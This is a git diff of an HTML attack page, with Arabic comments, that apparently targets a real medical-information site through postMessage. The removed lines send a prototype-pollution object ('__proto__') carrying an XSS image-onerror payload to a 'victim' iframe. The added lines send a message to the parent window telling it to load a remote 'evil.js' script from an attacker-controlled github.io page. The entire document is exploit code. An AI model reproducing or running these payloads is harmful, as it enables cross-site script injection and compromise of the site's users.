@@ -10,23 +10,17 @@
     <script>
         const victimFrame = document.getElementById('victim');
 
-        // ننتظر حتى يتم تحميل الصفحة تماماً
-        setTimeout(() => {
-            console.log("🚀 Sending Poisoned Message...");
-            
-            // إرسال الرسالة المسمومة
-            // جربنا هنا دمج لغة JSON داخل الكائن لزيادة احتمالية المعالجة غير الآمنة
-            victimFrame.contentWindow.postMessage({
-                "type": "asmreq", 
-                "lrcmpData": {
-                    "callId": "vp:1",
-                    "__proto__": {
-                        "innerHTML": "<img src=x onerror=alert('XSS_SUCCESS_VIA_IFRAME_POSTMESSAGE')>",
-                        "POLLUTION_DONE": "YES"
-                    }
-                }
-            }, "*");
-        }, 5000); // 5 ثوانٍ لضمان تحميل سكربتات Adobe و Vue
+      // انتظر قليلاً حتى يتم تحميل الـ iframe بالكامل
+setTimeout(() => {
+    const victimFrame = window.parent; // أو حدد الـ iframe إذا كنت تفتحه داخل صفحة
+    const payload = {
+        message: "surveywriter",
+        source: "https://egyhaker.github.io/webmd.com-attacker/evil.js" // رابط الملف الذي صنعناه
+    };
+    
+    console.log("🚀 Sending Payload to inject remote script...");
+    victimFrame.postMessage(payload, "*"); 
+}, 3000);
     </script>
 </body>
 </html>
